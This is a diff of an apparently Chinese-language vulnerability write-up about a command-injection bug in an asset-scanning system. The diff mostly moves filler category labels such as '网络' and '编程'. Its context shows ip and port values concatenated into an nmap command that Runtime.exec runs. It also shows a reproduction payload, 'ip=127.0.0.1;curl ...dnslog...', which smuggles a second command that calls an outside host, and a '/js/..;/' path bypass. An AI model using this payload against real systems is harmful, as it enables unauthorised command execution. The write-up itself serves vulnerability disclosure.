@@ -36,6 +36,14 @@ asset_dir: embedded-base64
   }
 ```
 
+深入探索
+
+编程
+
+数据管理
+
+软件
+
 参数**ip**和**port**被带入**assetScann**方法中
 
 ```
@@ -61,6 +69,14 @@ public boolean assetScann(String fileSrc, String ip, String port) {
   }
 ```
 
+深入探索
+
+防病毒程序与恶意软件
+
+网络
+
+数据管理
+
 如果参数**port不为空或者null**这在拼接在`command`中 `-sV -p port`，然后再将`ip`拼接在后面，最后进入**getScannXmlFile**方法中
 
 ```
@@ -73,7 +89,7 @@ private boolean getScannXmlFile(String nmapDir, String command, String fileSrc) 
 
 调用**CmdKit.execute**执行上面拼接的命令
 
-计算机服务器
+网络
 
 ```
 public static boolean execute(String cmd) {
@@ -81,14 +97,6 @@ public static boolean execute(String cmd) {
     return !"EXECUTE_ERROR".equals(result);
   }
 ```
-
-深入探索
-
-计算机服务器
-
-编程
-
-网络
 
 跟进**executeForStr**方法，其中对针对不同的系统使用 `cmd /c` 或者 `/bin/sh` 调用**Runtime.getRuntime().exec**[执行最终的命令](https://mrxn.net/tag/rce)
 
@@ -132,7 +140,7 @@ public static boolean execute(String cmd) {
 
 该系统还存在几处需要adm权限（登录后）的[命令注入](https://mrxn.net/tag/rce)点，由于需要权限，暂不赘述。
 
-网络安全
+计算机服务器
 
 # 漏洞复现
 
@@ -147,6 +155,8 @@ ip=127.0.0.1;curl xxx.xx.xxx.dnslog.pt;&port=80
 ```
 
 [命令执行](https://mrxn.net/tag/rce)结果外带
+
+网络安全
 
 ```
 POST /js/..;/assetTopo/assetScanns HTTP/1.1
